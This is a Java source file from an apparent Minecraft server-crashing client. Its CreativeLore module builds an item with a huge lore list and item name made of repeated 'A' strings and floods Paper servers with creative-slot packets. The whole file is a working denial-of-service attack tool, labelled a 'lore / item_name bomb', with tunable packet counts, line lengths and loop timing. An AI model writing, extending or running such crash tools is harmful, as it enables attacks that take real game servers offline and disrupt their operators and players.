package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataItemName;
import me.dannycrasher.client.protocol.components.data.impl.DataLore;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.Tag;

public class CreativeLore extends Module {
	private ScheduledExecutorService executorService;

	public CreativeLore() {
		super("CreativeLore", "Paper creative-slot lore / item_name bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 100, "50");
		addArgument("lineCount", ArgumentType.INT, 1, 256, "64");
		addArgument("lineLength", ArgumentType.INT, 1, 32767, "1024");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
		addArgument("loopAmount", ArgumentType.INT, 1, 30, "10");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int lineCount = context.getInt("lineCount");
		int lineLength = context.getInt("lineLength");
		int slot = context.getInt("slot");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		String payload = "A".repeat(lineLength);
		List<Tag> lines = new ArrayList<>(lineCount);
		for (int i = 0; i < lineCount; i++) {
			lines.add(textComponent(payload));
		}

		DataComponents components = new DataComponents();
		components.put(new DataLore(lines));
		components.put(new DataItemName(textComponent(payload)));
		ItemStack item = new ItemStack(ItemType.STONE.getId(protocol), 1, components);

		executorService = CreativeAttackHelper.start(this, context, executorService, packets, threadSleep, loopAmount, slot, item);
	}

	private static Tag textComponent(String text) {
		CompoundTag tag = new CompoundTag();
		tag.putString("text", text);
		return tag;
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
